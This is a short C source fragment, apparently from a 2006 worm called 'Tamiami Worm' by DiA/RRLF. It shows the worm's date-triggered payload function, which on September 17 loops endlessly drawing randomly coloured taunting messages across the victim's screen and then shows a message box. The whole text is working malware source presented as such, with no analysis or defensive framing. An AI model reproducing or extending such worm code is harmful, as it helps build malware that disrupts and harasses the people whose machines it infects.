   void Payload(void)
   {
       HDC     DCHandle;
       int     RandomText;
       char    *PayloadText[] =    {
                                       "Tamiami Worm by DiA/RRLF (c)2006",
                                       "Ready Rangers Liberation Front",
                                       "THIRD! I will call Dwight Chan 10. See if you can catch me." ,
                                       "STRANGLER STRANGLER STRANGLER",
                                       "feat. Conde",
                                   };
       SYSTEMTIME SystemTime;

       GetSystemTime(&SystemTime);

       if(SystemTime.wMonth == 9 && SystemTime.wDay == 17) //on September 17, the "Tamiami Strangler" struck for the first time
       {
           DCHandle = CreateDC("DISPLAY", 0, 0, 0);

           if(DCHandle != 0)
           {
               SetBkMode(DCHandle, TRANSPARENT);

               while(1)
               {
                   SetTextColor(DCHandle, RGB(RandomNumber(255), RandomNumber(255), RandomNumber(255)));

                   RandomText = RandomNumber(5);

                   TextOut(DCHandle, RandomNumber(1200), RandomNumber(1000), PayloadText[RandomText], lstrlen(PayloadText[RandomText]));

                   Sleep(200);
               }
           }

           MessageBox(0, "Tamiami Worm by DiA/RRLF (c)2006", "Conde", 0);
       }

       return;
   }
